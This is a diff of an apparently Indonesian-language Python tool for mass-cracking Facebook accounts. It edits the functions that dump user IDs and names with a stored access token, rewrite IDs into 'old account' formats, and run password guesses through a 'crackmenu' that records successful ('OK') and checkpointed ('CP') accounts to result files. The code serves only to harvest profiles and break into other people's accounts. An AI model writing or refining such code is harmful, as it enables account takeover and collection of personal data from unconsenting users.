@@ -241,6 +241,8 @@ def dumppro():
 	elif fila == filex:
 		jalan(war+"Nama File Tidak Boleh Sama !")
 		dumppro()
+	file_new = open(fila,"w")
+	file_new = open(filex,"w")
 	print(war+"Hasil Dump Masal : dump/"+filex+".json")
 	print(war+"Hasil Dump Old : dump/"+fila+".json")
 	try:
@@ -267,9 +269,11 @@ def dumppro():
 	jalan(war+"Tekan CTRL + C Untuk Stop Dump !!")
 	try:
 		pro1(".lpp",limit,filex,fila)
+	except (KeyboardInterrupt,EOFError):
+		jalan(war+"Dump DiStop !!");time.sleep(7);menu()
 	except Exception as e:
 		exit((k+"["+p+"•"+k+"]"+p+" Error : %s"%e)),;time.sleep(1)
-def pro1(file,lim,savefile,fila):
+def pro1(file,lim,savefile,saveold):
     try:
         list_akun=open(file).read().splitlines()
         with ThreadPoolExecutor(max_workers=5) as su:
@@ -277,16 +281,18 @@ def pro1(file,lim,savefile,fila):
                         for akun in list_akun:
                                 akn=akun.split("<=>")
                                 try:
-                                    su.submit(buat_,akn[0],savefile,fila)
+                                    su.submit(buat_,akn[0],savefile,saveold)
 #                                    su.submit(dump_public,akn[0],lim,savefile,fila)
                                 except (KeyboardInterrupt,EOFError):
                                     jalan(war+"Dump DiStop !!");time.sleep(4);menu()
                 except (KeyError, IOError):
                     exit(war+"Done...")
+                except (KeyboardInterrupt,EOFError):
+                    jalan(war+"Dump DiStop !!");time.sleep(7);menu()
     except (KeyError, IOError):
         exit(war+"File Tidak Tersedia !!")
 
-def buat_(idt,save,fila):
+def buat_(idt,save,saold):
 	try:
 		toket = open("login.txt","r").read()
 		token = open("login.txt","r").read()
@@ -316,19 +322,24 @@ def buat_(idt,save,fila):
 			nama = ii['name']
 			nm = ii['name']
 			try:
-				if len(uid) < 10:
-					ppx=open("dump/"+fila+".json", "a+")
+				if len(uid) < 6:
+					olj=open("dump/"+saold+".json", "a+")
+#					olj=open("dump/Boke.txt", "a+")
+					olj.write(uid+"<=>"+nama+"\n")
+					print(uid)
 					olq.append(uid+'<=>'+nm)
-					ppx.write(uid+"<=>"+name+"\n")
-					ppx.close()
 			except:pass
 			try:
-				oldd = uid.split("00000")
-				old = (f"100000{oldd[1]}")
-				olq.append(uid+'<=>'+nm)
-				ppx=open("dump/"+fila+".json", "a+")
-				ppx.write(old+"<=>"+name+"\n")
-				ppx.close()
+				oldd = uid.split("0000")
+				old = (f"10000{oldd[1]}")
+				olq.append(old+'<=>'+nm)
+				olj=open("dump/"+saold+".json", "a+")
+				olj.write(old+"<=>"+nama+"\n")
+				print(uid)
+#				olq.append(uid+'<=>'+nm)
+#				ppx=open("dump/"+olds+".json", "a+")
+#				ppx.write(old+"<=>"+name+"\n")
+#				ppx.close()
 			except:pass
 			lq.append(uid+'<=>'+nm)
 			dump.write(uid+'<=>'+nm+'\n')
@@ -595,8 +606,8 @@ class crackmenu:
             pw = pw.lower()
             try: os.mkdir('Hasil')
             except: pass
-            sys.stdout.write('\r%s[Crack] %s/%s OK:%s CP:%s '%(Q,loop,len(self.id),len(ok),len(cp))),
-            sys.stdout.flush()
+ #           sys.stdout.write('\r%s[Crack] %s/%s OK:%s CP:%s '%(Q,loop,len(self.id),len(ok),len(cp))),
+#            sys.stdout.flush()
             try:
                  useragenth = open(".ua","r").read()
             except IOError:
@@ -637,6 +648,8 @@ class crackmenu:
                 open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                 break
                 continue
+            sys.stdout.write('\r%s[%s] %s/%s OK:%s CP:%s '%(Q,response.json()["error_msg"][0:10],loop,len(self.id),len(ok),len(cp))),
+            sys.stdout.flush()
 
         loop += 1
 
